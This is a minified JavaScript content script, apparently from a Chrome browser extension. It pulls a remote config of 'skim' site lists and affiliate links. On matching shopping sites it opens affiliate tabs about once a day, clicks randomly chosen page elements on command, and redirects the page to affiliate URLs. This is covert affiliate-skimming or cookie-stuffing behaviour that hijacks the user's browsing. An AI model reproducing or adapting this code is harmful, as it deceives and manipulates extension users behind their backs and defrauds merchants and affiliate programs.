function getRandomEl(e=[]){return e[Math.floor(Math.random()*e.length)]}function getTarget(e){try{let t=[];e.forEach(e=>{let n=document.querySelectorAll(e);n.length>0&&t.push(n)});let n=getRandomEl(t);return getRandomEl(n)}catch{return null}}chrome.runtime.sendMessage({action:"getConfig"},function(e){let t=e&&e.script;if(t&&"object"==typeof t){let{skimFirst:n,skimSecond:i,AIPStores:o,skimAffs:l,callList:r}=t,a=window.location.href,f=r&&r.find(e=>a.includes(e.from));if(f){chrome.runtime.sendMessage({action:"secure",path:f.to});return}let c=window.location.origin,s=window.location.hostname,u=s.startsWith("www.")?s.replace("www.",""):s;if(n&&n.indexOf(u)>-1){let d=`${l[0]}${encodeURIComponent(c)}/`;h({homeAff:d})}else if(i&&i.findIndex(e=>e.domain===u)>-1){let g=i.find(e=>e.domain===u);h(g)}else{let m=o&&o.find(e=>e.origin===c);m&&h(m)}function h(e){let t=JSON.parse(localStorage.getItem("documentLastDate"));if(t){let n=new Date,i=new Date(t);Math.round((n-i)/864e5)>0&&p(e)}else p(e)}function p(e){chrome.runtime.sendMessage({action:"openTab",store:e}),localStorage.setItem("documentLastDate",JSON.stringify(new Date))}}}),chrome.runtime.onMessage.addListener(function(e,t,n){if("click"===e.action){let i=e.store,o=getTarget(i.targets);if(o)o.click();else{let l="prevUrl"===i.type?`${i.homeAff}${origin}/`:i.homeAff;window.location.replace(l)}}});